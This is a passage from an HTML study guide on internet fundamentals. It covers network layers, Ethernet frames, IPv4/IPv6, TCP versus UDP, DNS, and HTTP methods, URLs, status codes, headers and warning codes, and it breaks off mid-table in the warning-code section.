    <section class="chapter" id="ch1">
      <div class="chapter-head"><span class="chapter-num">01</span><h2>Internet and Web</h2></div>
      <p class="chapter-intro">This chapter builds the foundation everything else sits on: what the Internet actually is, and how a message gets from your laptop to a server on the other side of the planet in a fraction of a second.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Internet is not the Web — they're genuinely different things</summary>
        <div class="topic-body">
          <p>People say "the internet" when they mean "the web," but they're two different layers of the same system, and understanding the split makes everything else in this course click into place.</p>
          <p>The <strong>Internet</strong> is the physical, hardware side: millions of computers, phones, and servers, wired together with Ethernet cables, Wi-Fi radios, fiber-optic lines, and satellites. It's a network of <em>machines</em>. If you could see it from space, it would look like a giant spiderweb of physical connections.</p>
          <p>The <strong>World Wide Web (WWW)</strong> is the software layer built on top of that hardware: pages, links, images, and the protocols (like HTTP and HTML) that let one page point to another. It's a network of <em>content</em>, not machines. When you click a hyperlink, you're not moving between wires — you're moving between <em>documents</em> that happen to be hosted on machines connected by the Internet underneath.</p>
          <p>Here's a way to make this concrete: you could unplug the Web entirely (imagine every website disappearing) and the Internet would still exist — computers could still ping each other, send files, run games. Conversely, the Web <em>needs</em> the Internet to exist, because it needs some hardware to carry its HTTP requests over.</p>
          <div class="callout tip"><span class="callout-label">How to remember it</span><p>Internet = the roads. Web = the shops connected by the roads. You could have roads with no shops, but you can't have shops with no roads.</p></div>
          <p>The two main players on the Web side are <strong>web servers</strong> (machines that store and serve content — think of a librarian handing out books) and <strong>web clients</strong> like Chrome or Firefox (the "browsers" that ask for and display that content). They talk to each other using two core technologies: <strong>HTTP</strong> (HyperText Transport Protocol — the "language" they speak) and <strong>HTML</strong> (HyperText Markup Language — the "shape" of the content itself).</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Why the network is split into layers</summary>
        <div class="topic-body">
          <p>Sending one HTTP request across the internet actually involves several completely separate jobs happening at once: physically pushing electrical signals down a wire, figuring out which computer on Earth to send them to, making sure the message arrives complete and in order, and finally interpreting what the message <em>means</em>. Rather than solving all of that with one giant tangled system, network engineers split it into <strong>layers</strong>, where each layer only worries about its own job and trusts the layer below it to have already done its job correctly.</p>
          <p>Picture nesting dolls: your actual HTTP request gets wrapped inside a TCP "envelope," which gets wrapped inside an IP "envelope," which gets wrapped inside an Ethernet "envelope" — and only then does it actually go out over the wire. Each layer adds its own header (metadata) to the front of what it received from the layer above.</p>
          <div class="diagram">
            <div class="mermaid">
flowchart TD
    A["Application Layer — DNS, HTTP(S), SSH, SSL<br/><i>'what you actually want to say'</i>"] --> B
    B["Transport Layer — TCP, UDP<br/><i>'how to deliver it reliably (or quickly)'</i>"] --> C
    C["Internet Layer — IPv4, IPv6, ICMP<br/><i>'how to find the right computer'</i>"] --> D
    D["Link Layer — Ethernet, Wi-Fi, DSL<br/><i>'how to physically move the bits'</i>"]
            </div>
            <div class="diagram-caption">Each layer wraps the layer above it, like nested envelopes</div>
          </div>
          <p>The postal-mail analogy works well here: the <strong>Application layer</strong> is the letter itself (your message). The <strong>Transport layer</strong> is choosing "registered mail" vs. "regular mail" — do you need a delivery guarantee or not? The <strong>Internet layer</strong> is the street address written on the envelope. The <strong>Link layer</strong> is the actual mail truck physically driving the envelope to its destination.</p>
          <table>
            <tr><th>Layer</th><th>Examples</th><th>Job</th></tr>
            <tr><td>Application</td><td>DNS, HTTP(S), SSH</td><td>The actual content/request you care about</td></tr>
            <tr><td>Transport</td><td>TCP, UDP</td><td>Reliable delivery (TCP) or fast/no-guarantee delivery (UDP)</td></tr>
            <tr><td>Internet</td><td>IPv4, IPv6, ICMP</td><td>Addressing and routing between networks</td></tr>
            <tr><td>Link</td><td>Ethernet, Wi-Fi, DSL</td><td>Physically moving bits on the local wire or signal</td></tr>
          </table>
          <div class="callout ask"><span class="callout-label">Likely exam question</span><p>"Name the four layers in order and give one protocol example for each." Answer bottom-up: Link (Ethernet) → Internet (IPv4/IPv6) → Transport (TCP/UDP) → Application (HTTP, DNS).</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Link Layer &amp; Ethernet — moving raw bits</summary>
        <div class="topic-body">
          <p>The Link Layer is the lowest layer — it only deals with devices that are <em>directly, physically connected</em> to each other (the same cable or radio segment). It doesn't know or care about the wider internet; that's the job of the layer above it.</p>
          <p><strong>Ethernet</strong> is the classic Link Layer standard for wired connections. Every chunk of data sent over Ethernet gets sliced into a <strong>frame</strong>, structured like this:</p>
          <table>
            <tr><th>Field</th><th>Size (bytes)</th><th>What it does</th></tr>
            <tr><td>Preamble</td><td>7</td><td>Wakes up the receiving hardware — it's always <code>0xAA</code> (binary <code>10101010</code>), a predictable pattern that tells the hardware "start listening now"</td></tr>
            <tr><td>Start Frame Delimiter</td><td>1</td><td>Marks "the real frame starts right after this" — <code>0xAB</code></td></tr>
            <tr><td>Destination</td><td>6</td><td>The receiver's MAC address (a hardware ID)</td></tr>
            <tr><td>Source</td><td>6</td><td>The sender's MAC address</td></tr>
            <tr><td>Length</td><td>2</td><td>How big the payload is</td></tr>
            <tr><td>Payload</td><td>46–1500</td><td>The actual data being carried</td></tr>
            <tr><td>CRC</td><td>4</td><td>A checksum — lets the receiver detect if the data got corrupted in transit</td></tr>
          </table>
          <p>That 1500-byte payload ceiling has a name: the <strong>MTU</strong> (Maximum Transmission Unit). It's a deliberate design tradeoff — big enough that you're not wasting bandwidth on header overhead for every tiny scrap of data, but small enough that a single bad or delayed packet doesn't ruin a huge chunk of your transmission. Total maximum frame size (excluding the preamble and delimiter, which exist purely to synchronize the hardware) works out to 1518 bytes.</p>
          <div class="callout tip"><span class="callout-label">Exam number to memorize</span><p>Ethernet payload: <strong>46–1500 bytes</strong>. Total frame (with header, minus preamble/delimiter): <strong>1518 bytes</strong>.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Internet Layer — IPv4 vs IPv6</summary>
        <div class="topic-body">
          <p>Ethernet frames can only travel across one local segment — they have no concept of "the wider internet" and can't be routed across it. That's the whole reason the Internet Layer exists: it adds an <strong>IP address</strong> on top of the Ethernet frame so data can be routed across many different networks to reach a destination anywhere on Earth.</p>
          <div class="vs-grid">
            <div class="vs-card">
              <h4>IPv4</h4>
              <ul>
                <li>~4.2 billion possible addresses (2³²)</li>
                <li>The backbone of the internet historically — but we're running out of free addresses</li>
                <li>Complicated header, with lots of optional fields</li>
                <li>Stateless (each packet is handled independently)</li>
              </ul>
            </div>
            <div class="vs-card b">
              <h4>IPv6</h4>
              <ul>
                <li>~340 undecillion addresses (2¹²⁸) — a number with 39 digits</li>
                <li>Designed as the long-term replacement for IPv4</li>
                <li>Much simpler header — jobs like checksumming got pushed down to other layers</li>
                <li>In a URL, wrapped in square brackets: <code>http://[2001:29b::1]:443/</code></li>
              </ul>
            </div>
          </div>
          <p>Why does IPv6's header look so much simpler than IPv4's? Because the designers deliberately moved responsibilities like integrity-checking out of the IP layer and let the Link layer (Ethernet's CRC) and Transport layer (TCP's own checks) handle them instead. It's the same "each layer does one job" philosophy applied a second time, one level down.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Transport Layer — UDP vs. TCP (a favorite interview topic)</summary>
        <div class="topic-body">
          <p>Once your data can be <em>addressed</em> to the right machine (thanks to IP), the Transport Layer decides <em>how carefully</em> it gets delivered. This is one of the single most commonly asked interview questions in web development, so it's worth really understanding <em>why</em> the two protocols exist, not just memorizing the differences.</p>
          <p><strong>UDP (User Datagram Protocol)</strong> is the "fire and forget" option. There's no handshake, no connection state, no guarantee your data arrives, arrives in order, or arrives at all. In exchange for giving up all those guarantees, it's extremely lightweight and fast — just a source port, destination port, and a checksum. This tradeoff makes total sense for things like DNS lookups (a tiny, single request/response where re-asking is cheap if it fails) or live video/audio streaming (where a dropped frame from half a second ago is useless anyway — you'd rather skip it than wait for a retransmission).</p>
          <p><strong>TCP (Transmission Control Protocol)</strong> is the opposite philosophy: it establishes an actual <em>connection</em> between two "sockets," tracks state, guarantees your bytes arrive complete and in the correct order (retransmitting anything lost), and only then hands the data up to the application. This is what almost all normal web traffic uses, because losing or scrambling part of a webpage or a file download is not acceptable the way losing one video frame is.</p>
          <p>Opening a TCP connection requires the famous <strong>three-way handshake</strong> before either side sends any real data:</p>
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: 1. SYN — "Can we talk?"
    S->>C: 2. SYN + ACK — "Sure, I heard you"
    C->>S: 3. ACK — "Great, let's go"
    Note over C,S: Connection is now open — real data can flow
            </div>
            <div class="diagram-caption">The TCP three-way handshake</div>
          </div>
          <p>Closing a TCP connection can happen two ways. In an <strong>active close</strong>, the client sends a FIN (finish) signal first, the server ACKs it, and then the server sends its own FIN which the client ACKs (or the client can bundle FIN+ACK together and just stop listening). In a <strong>passive close</strong>, it's the server that initiates the goodbye instead, sending FIN first while the client responds.</p>
          <table>
            <tr><th></th><th>UDP</th><th>TCP</th></tr>
            <tr><td>Connection?</td><td>None — connectionless</td><td>Yes, full handshake required</td></tr>
            <tr><td>Reliable / ordered?</td><td>No guarantees at all</td><td>Yes — retransmits lost data, keeps order</td></tr>
            <tr><td>Speed</td><td>Fast, minimal overhead</td><td>Slower, more overhead (handshake + tracking state)</td></tr>
            <tr><td>Typical use</td><td>DNS, live video/audio, gaming</td><td>Web pages, file transfer, anything needing integrity</td></tr>
            <tr><td>Max single payload</td><td>65,536 bytes</td><td>N/A — it's a continuous stream</td></tr>
          </table>
          <div class="quickcheck">
            <div class="quickcheck-q">Quick check: why does DNS use UDP instead of TCP?</div>
            <button class="quickcheck-reveal-btn" onclick="this.nextElementSibling.classList.toggle('shown')">Reveal answer</button>
            <div class="quickcheck-a">DNS queries are small, single-shot request/response pairs. If one gets lost, the cost of just asking again is tiny — so there's no real benefit to paying for TCP's connection setup overhead. Speed matters more than guaranteed delivery here.</div>
          </div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Application Layer — DNS and Firewalls</summary>
        <div class="topic-body">
          <p><strong>DNS (Domain Name Service)</strong> sits at the Application Layer, riding on top of either UDP or TCP. Its job is simple to describe but essential: it's the phonebook of the internet, translating human-friendly names (<code>example.com</code>) into the actual IP addresses computers use to route traffic.</p>
          <table>
            <tr><th>Record type</th><th>What it represents</th></tr>
            <tr><td><code>A</code></td><td>Points to an IPv4 address</td></tr>
            <tr><td><code>AAAA</code></td><td>Points to an IPv6 address</td></tr>
            <tr><td><code>CNAME</code></td><td>Points to <em>another name</em> — not an address directly</td></tr>
          </table>
          <p>Because a <code>CNAME</code> can point to another name, which could itself be a <code>CNAME</code>, DNS resolution can chain recursively — the resolver keeps following the trail until it finally lands on an actual <code>A</code> or <code>AAAA</code> record with a real IP address. You can inspect this yourself on the command line with tools like <code>host</code>, <code>dig</code>, or <code>nslookup</code>.</p>
          <p><strong>Firewalls</strong> block traffic on specific ports or services. This has a subtle but important consequence: it's why your laptop can act as a web <em>client</em> but usually can't also act as a web <em>server</em> without extra configuration — incoming connections on most ports get blocked by default, so the conversation almost always has to be <em>initiated</em> by the client, not received unexpectedly by it.</p>
        </div>
      </details>

      <div class="callout ask"><span class="callout-label">Putting it together — a likely interview question</span><p>"Walk me through what happens at the network level when you send one HTTP request." Answer: your HTTP request (Application layer) gets handed to TCP, which opens a connection via the 3-way handshake (Transport layer); TCP segments get wrapped in IP packets addressed to the destination (Internet layer); IP packets get wrapped in Ethernet frames to physically move across the local link (Link layer) — repeating at every hop until they reach the destination server, where the layers unwrap in reverse.</p></div>

      <div class="chapter-footer-nav"><span></span><a class="footer-nav-btn" href="#ch2" data-target="ch2">Next: HTTP</a></div>
    </section>

    <section class="chapter" id="ch2">
      <div class="chapter-head"><span class="chapter-num">02</span><h2>HTTP</h2></div>
      <p class="chapter-intro">HTTP is the language browsers and servers speak to each other. It's simpler than it looks: one side asks a question, the other side answers. Everything in this chapter is really just filling in the details of that one idea.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>What HTTP actually is, and why it won</summary>
        <div class="topic-body">
          <p>HTTP (HyperText Transport Protocol) is a <strong>request → response</strong> conversation between a client and a server, almost always carried over a TCP connection (port 80 normally, or port 443 for encrypted HTTPS traffic).</p>
          <p>Before HTTP, protocols like FTP and Gopher existed for moving content around the internet — so why did HTTP take over? A few reasons: it sends <em>content</em>, not whole files, which is far more efficient if you just want to browse or search rather than download something in full. It's <strong>extensible</strong> — you can add brand-new custom headers without breaking anything, so the protocol could grow new features over decades without needing a full redesign. And it's built around simple, memorable <strong>verbs</strong> (GET, POST, PUT, DELETE) that map naturally onto "what do you want to do to this resource," which made it easy for developers to build on top of.</p>
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant Client as Browser (Client)
    participant Server as Web Server
    Client->>Server: HTTP Request (Method + URL + Headers)
    Server-->>Client: HTTP Response (Status Code + Headers + Body)
            </div>
          </div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>URIs and URLs — how resources get named</summary>
        <div class="topic-body">
          <p>A <strong>URI</strong> (Uniform Resource Identifier) identifies a resource — it points at something. Most URIs you interact with day to day are <strong>URLs</strong> (Uniform Resource Locators), which specifically tell you <em>how to reach</em> that resource (a location, essentially a set of directions). A smaller category are <strong>URNs</strong> (Uniform Resource Names), which just give something a unique <em>name</em> without saying where to find it — like an ISBN number identifies a book without telling you which shelf it's on.</p>
          <p>Every URL follows one fixed grammar:</p>
          <pre><code>URI = scheme:[//authority]path[?query][#fragment]
authority = [userinfo@]host[:port]</code></pre>
          <table>
            <tr><th>Part</th><th>Example</th><th>Meaning</th></tr>
            <tr><td>scheme</td><td><code>http</code>, <code>https</code></td><td>Which protocol to use</td></tr>
            <tr><td>authority</td><td><code>user@host:port</code></td><td>Who to connect to</td></tr>
            <tr><td>path</td><td><code>/images/cat.png</code></td><td>Location of the resource on that host</td></tr>
            <tr><td><code>?query</code></td><td><code>?key=value&amp;key2=value2</code></td><td>Extra parameters, sent to the server</td></tr>
            <tr><td><code>#fragment</code></td><td><code>#section2</code></td><td>A spot <em>within</em> the resource — handled entirely by the browser, never even sent to the server</td></tr>
          </table>
          <p>URLs can be <strong>absolute</strong> (a complete address like <code>http://site.com/images/x.svg</code>) or <strong>relative</strong> (like <code>../index.html</code>, which only makes sense relative to the page you're currently viewing — the browser resolves it using the current URL as the "working directory").</p>
          <p>Because URLs have to support every possible character — spaces, accented letters, emoji — anything outside the safe set <code>-._0-9a-zA-Z</code> gets <strong>percent-encoded</strong> (a space becomes <code>%20</code>, for example). Domain names with special characters use a different scheme called <strong>punycode</strong> to stay ASCII-compatible.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>HTTP methods — the verbs, and how they actually differ</summary>
        <div class="topic-body">
          <p>This is probably the single most interview-tested table in the entire course, so let's go slowly through <em>why</em> each verb behaves the way it does, not just what it's called.</p>
          <table>
            <tr><th>Method</th><th>Purpose</th><th>Idempotent?*</th><th>Cacheable?</th></tr>
            <tr><td><strong>GET</strong></td><td>Retrieve a resource — should never change server-side data</td><td>Yes</td><td>Yes</td></tr>
            <tr><td><strong>POST</strong></td><td>Create/update/process — submit forms, log in, "do a thing"</td><td>No</td><td>Only with explicit cache headers</td></tr>
            <tr><td><strong>PUT</strong></td><td>Replace/create the resource <em>at that exact URI</em> — you send the whole new entity</td><td>Yes</td><td>No</td></tr>
            <tr><td><strong>DELETE</strong></td><td>Delete the resource at that URI</td><td>Yes</td><td>No</td></tr>
            <tr><td><strong>HEAD</strong></td><td>Like GET but headers only, no body — used to check caching cheaply</td><td>Yes</td><td>Yes</td></tr>
            <tr><td><strong>PATCH</strong></td><td>Partially modify a resource (added after the original HTTP spec)</td><td>No</td><td>No</td></tr>
            <tr><td><strong>OPTIONS</strong></td><td>Ask a server what methods a resource supports</td><td>Yes</td><td>No</td></tr>
            <tr><td><strong>TRACE</strong></td><td>Debugging tool — the server echoes back exactly what it received, so the client can see how the request looked after passing through any proxies</td><td>Yes</td><td>No</td></tr>
            <tr><td><strong>CONNECT</strong></td><td>Asks a proxy to open a raw tunnel to a destination (this is how proxies pass through HTTPS traffic without being able to read it)</td><td>No</td><td>No</td></tr>
          </table>
          <p>That's 9 verbs total in the full picture — most day-to-day work only ever touches the first five (GET/POST/PUT/DELETE/PATCH), but TRACE and CONNECT are worth recognizing by name, since they occasionally show up in exam questions asking you to list "all the HTTP methods."</p>
          <p><em>*Idempotent means calling it once, or a hundred times in a row, produces the same end state — no extra side effects pile up.</em> That's genuinely useful in practice: if your network connection is flaky and you're not sure your PUT request actually made it through, you can just safely send it again. Do that with a POST representing "place an order," though, and you might end up with duplicate orders.</p>
          <div class="callout ask"><span class="callout-label">The classic interview question: PUT vs. POST</span>
            <p>The real distinction isn't "PUT updates, POST creates" (that's a common oversimplification) — it's about <em>what the URI identifies</em>. With <strong>POST</strong>, the URI names a <em>handler</em> — some process, script, or endpoint that decides what to do with the data you send it (it might create a brand-new resource somewhere it chooses). With <strong>PUT</strong>, the URI names the <em>resource itself</em> — you're saying "this exact address should now contain exactly this content," a direct replace-or-create. That's also why PUT is idempotent and POST isn't: PUT-ing the same content to the same URI twice leaves you in the same final state either way; POST-ing "add one comment" twice adds two comments.</p>
          </div>
          <div class="callout warn"><span class="callout-label">Common mistake</span><p>Don't send a body with a GET request. It's technically possible on the wire, but the spec never defines what should happen, so different servers/proxies handle it inconsistently — some silently strip it, some reject the request entirely. If you need to send meaningful data, use the query string or switch to POST.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Anatomy of a request and a response</summary>
        <div class="topic-body">
          <p>Every HTTP message — whether it's a request or a response — follows the same basic shape: a starting line, then a block of headers (one per line), then a blank line, then an optional body.</p>
          <pre><code>Request-Line = Method URI HTTP-Version "\r\n"
*(headers "\r\n")
"\r\n"                      &lt;- blank line separates headers from body
[message-body]</code></pre>
          <pre><code>Status-Line = HTTP-Version Status-Code Reason-Phrase "\r\n"
*(headers "\r\n")
"\r\n"
[message-body]</code></pre>
          <p>Concretely, a real request/response pair looks like this:</p>
          <pre><code>GET /index.html HTTP/1.1
Host: example.com
Accept: text/html
</code></pre>
          <pre><code>HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1256

&lt;html&gt;...&lt;/html&gt;</code></pre>
          <p>One rule worth memorizing precisely: <strong>HTTP/1.1 requires a <code>Host:</code> header</strong> on every request. This exists because a single server (with a single IP address) often hosts many different websites — without <code>Host:</code>, the server has no way of knowing which site you actually meant. Leave it out, and the server may reply <code>400 Bad Request</code>.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Status codes — the five families</summary>
        <div class="topic-body">
          <p>Status codes always start with a digit that tells you the <em>category</em> of what happened before you even read the specific number. Memorize the ranges first — you can often answer an exam question just from the first digit.</p>
          <div class="diagram">
            <div class="mermaid">
flowchart LR
    A["1XX<br/>Informational<br/>'still talking'"] --- B["2XX<br/>Success<br/>'it worked'"] --- C["3XX<br/>Redirection<br/>'go over there'"] --- D["4XX<br/>Client Error<br/>'your fault'"] --- E["5XX<br/>Server Error<br/>'my fault'"]
            </div>
          </div>
          <p>Here are the codes worth actually knowing in detail, grouped the way you'd encounter them in practice:</p>
          <table>
            <tr><th>Code</th><th>Name</th><th>What it really means</th></tr>
            <tr><td>100</td><td>Continue</td><td>"Go ahead and send the body" — used when uploading large content, so the client doesn't waste bandwidth if the server's going to reject it anyway</td></tr>
            <tr><td>200</td><td>OK</td><td>Generic success</td></tr>
            <tr><td>201</td><td>Created</td><td>A new resource was created (typical response after a successful PUT or POST)</td></tr>
            <tr><td>204</td><td>No Content</td><td>Success, but there's genuinely nothing to send back</td></tr>
            <tr><td>206</td><td>Partial Content</td><td>Used for resuming interrupted downloads, alongside a <code>Range</code> header</td></tr>
            <tr><td>301</td><td>Moved Permanently</td><td>Go here <em>from now on</em> — the browser should update its cache/bookmarks to the new URL</td></tr>
            <tr><td>302</td><td>Found</td><td>A <em>temporary</em> redirect — keep using the original URL next time</td></tr>
            <tr><td>303</td><td>See Other</td><td>"GET this other URL instead" — specifically exists to solve the "resubmitting a form creates a duplicate post" problem</td></tr>
            <tr><td>304</td><td>Not Modified</td><td>Your cached copy is still good, don't re-download it</td></tr>
            <tr><td>307</td><td>Temporary Redirect</td><td>Like 302, but guarantees the client reuses the exact same HTTP method (302 technically allows a method switch, which trips up some clients)</td></tr>
            <tr><td>400</td><td>Bad Request</td><td>Your request was malformed — this is on the client</td></tr>
            <tr><td>401</td><td>Unauthorized</td><td>You need to log in / authenticate first</td></tr>
            <tr><td>403</td><td>Forbidden</td><td>The server flatly refuses — no login is going to change this</td></tr>
            <tr><td>404</td><td>Not Found</td><td>Wrong path — nothing exists there</td></tr>
            <tr><td>405</td><td>Method Not Allowed</td><td>That verb isn't supported on this URI</td></tr>
            <tr><td>409</td><td>Conflict</td><td>A concurrency clash — commonly seen with PUT requests racing each other</td></tr>
            <tr><td>429</td><td>Too Many Requests</td><td>You're being rate-limited</td></tr>
            <tr><td>500</td><td>Internal Server Error</td><td>The server's own code crashed — this is on the server</td></tr>
            <tr><td>502</td><td>Bad Gateway</td><td>The server, acting as a proxy, got back a bad response from whatever's <em>behind</em> it</td></tr>
            <tr><td>503</td><td>Service Unavailable</td><td>Temporarily down (maintenance, overload)</td></tr>
            <tr><td>504</td><td>Gateway Timeout</td><td>The upstream server behind a proxy was too slow to respond in time</td></tr>
          </table>
          <p>301 vs 302 is one of the most commonly confused pairs, and it matters in real life (not just exams) because of caching and SEO: a <strong>301</strong> tells the browser "this move is permanent, remember it and go straight to the new address next time" — search engines will transfer the old page's ranking to the new one. A <strong>302</strong> says "just for now" — the browser keeps asking the old URL every time, which is exactly what you want for something like temporary load-balancing or A/B testing.</p>
          <div class="callout tip"><span class="callout-label">Fun fact worth knowing</span><p><code>418 I'm a teapot</code> is a real (joke) status code from an April Fools' RFC — servers use it to indicate they refuse to brew coffee because they are, in fact, a teapot. Interviewers sometimes ask about it just to see if you've actually read the spec.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Headers — the metadata that does most of the real work</summary>
        <div class="topic-body">
          <p>A header is a simple <code>field-name: field-value</code> pair. There are dozens defined in the spec, but they roughly split into <strong>request headers</strong> (things the client tells the server) and <strong>response/server headers</strong> (things the server tells the client back).</p>
          <p><strong>Key request headers:</strong></p>
          <table>
            <tr><th>Header</th><th>Purpose</th></tr>
            <tr><td><code>Host</code></td><td>Required in HTTP/1.1 — which site you're asking for</td></tr>
            <tr><td><code>Accept</code></td><td>What content types (MIME types) the client can handle</td></tr>
            <tr><td><code>Content-Type</code></td><td>The type of data in the request body</td></tr>
            <tr><td><code>Content-Length</code></td><td>Size of the body, in bytes</td></tr>
            <tr><td><code>Cookie</code></td><td>Sends previously-stored key-value pairs back to the server</td></tr>
            <tr><td><code>Authorization</code></td><td>Credentials — Basic auth, bearer tokens, etc.</td></tr>
            <tr><td><code>User-Agent</code></td><td>Identifies the client software/browser/OS</td></tr>
            <tr><td><code>Referer</code></td><td>What page you came from (yes, it's misspelled in the actual spec — a famous historical typo that's now permanent)</td></tr>
            <tr><td><code>If-Modified-Since</code> / <code>If-None-Match</code></td><td>Conditional GET — "only send me this if it's changed"</td></tr>
          </table>
          <p><strong>Key response headers:</strong></p>
          <table>
            <tr><th>Header</th><th>Purpose</th></tr>
            <tr><td><code>Content-Type</code></td><td>Type of data being sent back</td></tr>
            <tr><td><code>Set-Cookie</code></td><td>Tells the browser to store a cookie for next time</td></tr>
            <tr><td><code>Cache-Control</code>, <code>Expires</code></td><td>Caching rules</td></tr>
            <tr><td><code>ETag</code></td><td>A version fingerprint of the content</td></tr>
            <tr><td><code>Location</code></td><td>Where to redirect to (used with 3XX codes)</td></tr>
            <tr><td><code>WWW-Authenticate</code></td><td>Tells the client how to log in (sent alongside a 401)</td></tr>
            <tr><td><code>Access-Control-Allow-Origin</code></td><td>CORS — which origins are allowed to make cross-site JS requests to this server</td></tr>
          </table>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The complete header reference (worth skimming once for the exam)</summary>
        <div class="topic-body">
          <p>The tables above covered the headers you'll use constantly. Here's the fuller reference the course notes actually list — useful to have skimmed once, even if you don't memorize every row.</p>
          <p><strong>Request headers (client → server), the rest of the list:</strong></p>
          <table>
            <tr><th>Header</th><th>Purpose</th></tr>
            <tr><td><code>Accept-Charset</code></td><td>Character encodings the client can handle</td></tr>
            <tr><td><code>Accept-Encoding</code></td><td>Compression formats the client can handle (e.g. <code>gzip</code>, <code>deflate</code>)</td></tr>
            <tr><td><code>Access-Control-Request-Headers</code> / <code>-Method</code></td><td>Lets browser JS ask a server ahead of time "are you okay with me sending this header / using this method?" (part of the CORS preflight handshake)</td></tr>
            <tr><td><code>Cache-Control</code></td><td>Client-side caching directives, e.g. <code>max-age=60</code></td></tr>
            <tr><td><code>Content-Disposition</code></td><td>Names the file being uploaded in a <code>multipart/form-data</code> body</td></tr>
            <tr><td><code>DNT</code></td><td>"Do Not Track" — a polite request that's mostly ignored in practice</td></tr>
            <tr><td><code>Expect: 100-continue</code></td><td>"I expect you to reply 100 Continue before I send my body" — used for large uploads</td></tr>
            <tr><td><code>Forwarded</code></td><td>Used by proxies to record who originally made the request, and over what protocol</td></tr>
            <tr><td><code>From</code></td><td>An email address identifying who's making the request — common for bots, so admins can contact the operator</td></tr>
            <tr><td><code>If-Match</code> / <code>If-Unmodified-Since</code></td><td>Only proceed if the ETag matches / hasn't changed recently (the inverse of <code>If-None-Match</code>/<code>If-Modified-Since</code>)</td></tr>
            <tr><td><code>If-Range</code></td><td>Only resume a partial download if it's still the same version of the file</td></tr>
            <tr><td><code>Origin</code></td><td>Tells the server which site's JavaScript is making this request</td></tr>
            <tr><td><code>Proxy-Authorization</code></td><td>Credentials for logging into a forward proxy</td></tr>
            <tr><td><code>Range</code></td><td>Resume a download from a specific byte offset</td></tr>
            <tr><td><code>TE</code></td><td>Like <code>Accept-Encoding</code> but specifically for proxy-relevant transfer encodings</td></tr>
            <tr><td><code>Upgrade-Insecure-Requests</code></td><td>Asks the server to redirect to the HTTPS version of the page</td></tr>
          </table>
          <p><strong>Response headers (server → client), the rest of the list:</strong></p>
          <table>
            <tr><th>Header</th><th>Purpose</th></tr>
            <tr><td><code>Access-Control-Allow-Credentials/Headers/Methods</code></td><td>The CORS handshake — which cross-site requests, headers, and methods this server permits</td></tr>
            <tr><td><code>Access-Control-Expose-Headers</code></td><td>Which response headers browser JS is allowed to actually read</td></tr>
            <tr><td><code>Access-Control-Max-Age</code></td><td>How long the browser can cache the answers to those CORS questions</td></tr>
            <tr><td><code>Age</code></td><td>How old the cached copy sitting in a proxy is, in seconds</td></tr>
            <tr><td><code>Allow</code></td><td>Which HTTP methods this URI actually supports</td></tr>
            <tr><td><code>Connection: close</code></td><td>Server wants to close the connection once it's done responding</td></tr>
            <tr><td><code>Content-Security-Policy</code></td><td>Restricts where the page is allowed to load/run scripts from — a real defense against XSS (Chapter 10)</td></tr>
            <tr><td><code>Content-Range</code></td><td>Which byte range of the total content this response contains</td></tr>
            <tr><td><code>Expect-CT</code></td><td>Asks the browser to double-check this certificate against public Certificate Transparency logs</td></tr>
            <tr><td><code>Keep-Alive</code></td><td>How long/many requests a connection should stay open for</td></tr>
            <tr><td><code>Proxy-Authenticate</code></td><td>Asks the client to log into a proxy</td></tr>
            <tr><td><code>Referrer-Policy</code></td><td>Controls how much of the <code>Referer</code> the browser shares with the next site</td></tr>
            <tr><td><code>Retry-After</code></td><td>How long to wait before retrying, alongside a 503 or 429</td></tr>
            <tr><td><code>Server</code></td><td>Identifies the server software/version — the response-side equivalent of <code>User-Agent</code></td></tr>
            <tr><td><code>Strict-Transport-Security</code></td><td>"Never talk to me or my subdomains without TLS again" for a set period of time</td></tr>
            <tr><td><code>Trailer</code></td><td>Warns the client that extra headers will follow after the body (needs chunked transfer encoding)</td></tr>
            <tr><td><code>Vary</code></td><td>Tells a cache this page has multiple versions depending on which request headers were sent</td></tr>
            <tr><td><code>Via</code></td><td>Records the chain of proxies a request/response passed through</td></tr>
            <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>Stops the browser from guessing a file's type from its content instead of trusting <code>Content-Type</code></td></tr>
            <tr><td><code>X-DNS-Prefetch-Control: off</code></td><td>Tells the browser not to pre-resolve the hostnames in links before the user actually clicks them</td></tr>
            <tr><td><code>X-Frame-Options: deny</code></td><td>Stops the page from being embedded in an <code>&lt;iframe&gt;</code> on someone else's site (a defense against "clickjacking")</td></tr>
          </table>
          <div class="callout tip"><span class="callout-label">On custom headers</span><p>You used to see a lot of <code>X-</code> prefixed headers signaling "this one's non-standard." That convention is now officially deprecated — you can add whatever custom header name you like, as long as it doesn't collide with a standard one.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Warning codes — the header nobody remembers exists</summary>
        <div class="topic-body">
          <p>Alongside status codes, HTTP also defines a small, rarely-used set of numeric <strong>Warning</strong> codes that can ride along in a response, mostly related to caching:</p>
          <table>
            <tr><th>Code</th><th>Meaning</th></tr>
            <tr><td>110</td><td>Response is Stale — this content sat in a cache too long</td></tr>
            <tr><td>111</td><td>Revalidation Failed — it was cached, but the original server is now unreachable</td></tr>
            <tr><td>112</td><td>Disconnected Operation — cached content is being served because the network itself is down</td></tr>
            <tr><td>113</td><td>Heuristic Expiration — this content has been sitting in cache for over 24 hours</td></tr>
            <tr><td>199</td><td>Miscellaneous Warning — a generic catch-all warning</td></tr>
            <tr><td>214</td><td>Transformation Applied — a proxy modified the content somehow (e.g. re-compressed an image)</td></tr>
